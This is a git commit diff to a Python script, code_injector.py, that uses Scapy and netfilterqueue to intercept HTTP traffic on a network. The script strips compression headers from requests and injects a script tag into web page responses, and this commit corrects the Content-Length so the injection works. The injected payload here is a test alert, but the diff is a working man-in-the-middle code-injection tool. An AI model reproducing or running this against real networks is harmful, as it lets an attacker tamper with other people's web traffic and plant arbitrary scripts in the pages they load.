caf57ea15cd041ac9fcd0d22a3e0462195ddf039
kali-ninja <kali-ninja@kali-ninja.kali-ninja>
2025-01-14 21:43:28 +0100

    done

--- code_injector.py
+++ code_injector.py
@@ -17,16 +17,24 @@ def process_packet(packet):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             print(scapy_packet.show())
-            load = load.replace("</body>", "<script>alert('test');</scripy></body>")
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+
+            content_length_search = re.search(r"(?:Content-Length:\s)(\d+)", load)
+            if content_length_search and "text/html" in load:
+                content_length = int(content_length_search.group(1))
+                new_content_length = content_length + len(injection_code)
+                load = load.replace(str(content_length), str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))
+            packet.set_payload(bytes(new_packet))
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
